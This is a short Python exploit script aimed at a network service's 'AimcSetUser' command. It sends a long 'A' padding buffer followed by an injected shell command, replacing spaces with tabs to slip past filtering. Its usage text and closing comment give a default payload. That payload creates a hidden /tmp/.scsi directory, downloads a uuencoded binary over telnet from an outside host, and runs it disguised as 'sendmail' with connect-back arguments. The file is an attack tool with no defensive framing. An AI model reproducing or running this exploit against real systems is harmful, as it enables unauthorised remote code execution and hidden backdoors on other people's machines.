#!/usr/bin/python
import sys
import socket

if(len(sys.argv) < 4):
	print ""
	print "Usage: %s <target-host> <port> <cmd-string>" % sys.argv[0]
	print "	--NOTE: All spaces in <cmd-string> will be replaced by \\t's"
	print "	-- A good default might be: "
	print "	'mkdir /tmp/.scsi ; cd /tmp/.scsi && telnet <host> <port>|uudecode && PATH=. D=\"-c <host> <port>\" sendmail;'"
	print ""
	sys.exit(1)
target_ip = sys.argv[1]
port =  int(sys.argv[2])
commands = sys.argv[3]
if(commands[0] == " "):
	commands = "\t"+commands[1:]
if(commands[len(commands)-1]==" "):
	commands = commands[0:len(commands)-1] + "\t"
for i in range(0,len(commands)):
	if(i>0 and i<len(commands) and commands[i] == " "):
		commands = commands[0:i]+"\t"+commands[i+1:]
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip,port))
s.send("AimcSetUser %s %s %s" % ("A"*512+ ";" + commands, "B"*254, "C"*256))
#'mkdir\t/tmp/.scsi\t;\tcd\t/tmp/.scsi\t&&\ttelnet\t555.1.2.36\t44442\t|uudecode\t&&\tPATH=.\tD="-c\t555.1.2.36\t44447"\tsendmail;'
